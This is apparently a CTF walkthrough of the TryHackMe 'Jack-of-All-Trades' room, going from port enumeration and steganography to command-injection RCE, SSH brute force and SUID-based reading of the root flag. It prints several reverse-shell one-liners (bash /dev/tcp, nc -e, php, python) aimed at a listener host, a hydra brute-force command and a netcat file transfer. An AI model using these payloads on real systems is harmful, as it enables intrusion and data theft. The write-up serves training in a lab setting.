# 🎯 Jack-of-All-Trades_Writeup | Complete Exploitation Walkthrough

---

<div align="center">

![target Look](https://miro.medium.com/v2/resize:fit:720/format:webp/1*xLSdEXLZ_yYf72OIwRQNGQ.png)

</div>

---

## 📌 **Task Overview**

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?
---


## 🔍 **Question 1:** How Many Ports Are Open?

### 📊 Reconnaissance: Nmap Enumeration

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)


This is quite fantastic to see the port 80 is serving as a ssh port and port 22 is serving as ssh port.


But it should be opposite the port 22 should serve as ssh port while the port 80 should serve as a http port.

To access it into the brower we got the error

```Error
ERR_UNSAFE_PORT
```

ERR_UNSAFE_PORT is a browser security feature. Browsers such as Chrome and Firefox block access to certain ports (including 22) because they're traditionally used by services like SSH and can be abused.

To access it into browser we remaped the site with

```bash
socat TCP-LISTEN:8080,fork TCP:<target-ip>:22
```

Just need to replace the ip with the ip obtained

After doing it we are able to open it into the browser.

After opening it into the browser.

### Part 2 Initial Foothold

Now when looked up into the source code of the webpage.

We got some useful info in the source code

```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```

Now look at that long string it ends with == so it is clear it is base64 decoding it gave us 

```test
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: REDACTED
```

After going to the page /recovery.php

We got this

![recovery](https://miro.medium.com/v2/resize:fit:720/format:webp/1*JqnSZmDZqMWBvd2lAPvusg.png)

Now Its time for the Login

> Login Attempt 1:

- User : Jack
- Pass : REDACTED

> Login Attempt 2:

- User : Jacky
- Pass : REDACTED

> Login Attemp 3:

- User : Johny Graves
- Pass : REDACTED

All 3 login attemps are unsuccsful.

Now its time to bruteforce the password.

But before doing bruteforcing i decided to enumurate some more cuz it is not a approcah that a good penetration tester should think.

So when i looked into the source code of login page it revealed me a long string.

It should be a decoding room why it a boot to root challange.

anyway here is the string

```base32
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```

Now this is endcoded into multiple layers the layers were

Base32 + Hex + ROT13

And in this way the text after decoding was 

```text
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

When proceeding to the link went me to wikipedia page

![wiki](https://i.imgur.com/Mf5FU5A.png)

Now after all this page was about dinasoures and there was also a pic of dinasour on the homepage that way in the hint it is said so.

So there should be some data embeeded into that image.

it was this image(Don't Expect any exif data embedded data into this image)

![dinasour image](https://muirlandoracle.co.uk/wp-content/uploads/2020/01/14-2-768x411.png)

The downloaded file was also named as stego.jpg

So we extracted the hidden data into with the tool steghide

with the command

```bash
steghide extract -sf stego.jpg
```

And when it asked for the passphrase we entered that which we decoded from base64.


And after entering it we got a file creds.txt which contains the irrelevent text. You could see too.


![steghide](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/steghide-768x134.png)


Now we should continue our bruteforcing. 

After doing bruteforcing for a long time we still doesn't able to get the password.


One reason could be that when we did extraction of data from that stego.jpg 

The base64 extracted password used there so it could mean this too that the string we obtaind is not the password of weblogin.

After it we did stego on left images on that site.

Left images were 

- jackinthebox.jpg
- header.jpg

When we did steghide for jackinthebox.jpg we used the same passphrase that we used for the file stego.jpg.

But this passphrase was incorrect for the file jackinthebox.jpg


Without wasting time lets proceed to the image header.jpg


Steghiding the header.jpg with the same passphrase as that is used in stego.jpg


This gave us a file which really contains the password and userid.

![cred](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/realcreds-768x141.png)


Now time to throw credentials at the recovery.php page.


After it we are loggedin with those credentials


![loggedin](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/injectionpage-768x432.png)


### Part 3 RCE | Remote Code Execution 

After logging in there is text on screen that is

```text
GET me a 'cmd' and I'll run it for you Future-Jack.
```

its endpoint was 


```url
http://localhost:8080/nnxhweOV/
```

So we decided to brutefocing on it didn't gave me anything. i think the phpsession id is protecting it from scanning.

When we try to conclude the line


GET me a 'cmd' and I'll run it for you Future-Jack.


That login page lead me to the page

- http://localhost:8080/nnxhweOV/index.php

and in the text it is said give me 'cmd'


so i think so that it is saying to give cmd as url parameter and we will be able to do command execution.


And it happens as per our expection it was accepting the command via the cmd parameter


Here it is 

http://localhost:8080/nnxhweOV/index.php?cmd=id

We have RCE

![RCE](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/idinjection-768x109.png)

After this when we list the files with ls we are not able to get the contents in proper format 


To get the proper format we opened the source code and the indentation and proper spacing was there.


Now its time to run a payload to get a proper shell.

> Payload 1

sh -i >& /dev/tcp/192.168.246.164/4444 0>&1


But this payload didn't gave me shell on my listener

so we tried to encode it with url encoding and hereis the payload that is encoded


> URL Encoded payload


sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.246.164%2F4444%200%3E%261


But this too didn't gave us the shell.


When i did reload the page to submit another payload the webpage hangs it was not loading that endpoit.


After few min it got corrected.

i think the payload get execute and that makes the page loading forever when i went to try for another payload


meaningly it could mean this too that the payload takes time to execute.


Anyway lets test first that whether it will gave us the connection or not by executing this command via the cmd param.


nc <ip> <port>


We got the connection 

Ncat: Connection from 10.48.167.128:39812.


Now we are sure that target could talk to us now lets wait and upload the same payload.

After waiting for connection for about 7 minutes we didn't get anything on our listener.

It sucks.

I need to now restart the machine from the tryhackme room page.

AFter it we then tried for the new payload

> payload 2

nc 192.168.246.164 4444 -e sh

This did gave a connectio nback but didn't gave us a shell.

> Payload 3

php -r '$sock=fsockopen("192.168.246.164",4444);exec("sh <&3 >&3 2>&3");'

> Payload 4

<?=`$_GET[0]`?>

> Payload 5

sh -i >& /dev/udp/192.168.246.164/4444 0>&1

But no any payload gave me the shell but then it comes the python one

> Payload 6

```python3
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.246.164",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

```

Now lets make it a better with a proper shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")' 
```

Now in the file /home/jacks_password_list

I got something it was

```hex
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Since it is password list so each line should be a individual password.

We are using this file as a wordlist of hydra.


After doing hydra attack with the command 

```bash
hydra -l jack -P <path-to-copied-passwords> -s 80 ssh://<remote-ip>
```

I got the password and with that password we can now login.


![poc](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/BrokenPassword-768x471.png)


But to connect to ssh we need to specify the port cuz the ssh is on port 80 not the default port 22.

The command will be

```sh
ssh -p 80 jack@<ip>

```

![ssh](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/ssh.png)

Now we can see there is a file named user.jpg.


since we will have difficulty into seeing that image.

We are going to extract the imagge to our local machine to open the file.

For this we will setup a listener on our local machine for a specif file that is user.jpg

with the command

```sh
nc -lvnp 4444 > user.jpg
```

On the target machine we will open the connection with nc with transversing only that image that is user.jpg


The command on host machine is


```sh
nc <tun0 interface ip> 4444 < <file to send that is user.jpg>
```

After this we got the file on our local machine and here is how taht user.jpg looks like


![image](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/userflag-768x744.png)


After this we got out flag that is user flag.


Now its time for the root flag


### Part 4 Privilage Escalation

Doing sudo -l gave me that current user jack has no root permission.

![sudo -l ](https://muirlandoracle.co.uk/wp-content/uploads/2020/01/29-1.png)


then checking for cronjob with cat /etc/crontab and crontab -e

But still nothing.

Nothing hidden files in /home folders or subfolders

nothing in /tmp

nothing inside /opt

Nothing inside the /var/www/html and its subdiretories.


Our next best bet is finding an executable file with the SUID bit set:

```sh
find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
```

![img](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/find4000-768x252.png)

One of these stands out as being really unusual: /usr/bin/strings.

strings is usually used to scan a file for human-readable strings of text. It’s very useful if you’re analysing files (e.g. for pulling strings out of compiled binaries, or for looking for signs of steganography having been used). In this case we’re looking for a text file (root.txt). Text files are, unsurprisingly, entirely comprised of strings.

So, for the easiest root flag in the history of CTFs, let’s use /usr/bin/strings to read the flag:

```sh
/usr/bin/strings /root/root.txt
```

![lst img](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/rootflag-768x135.png)

That monster! Not only is he trying to kill the penguins for a rug, he’s got a dead body in his garage! Well, at least we’ve got enough to go to the police now. The penguins are saved!
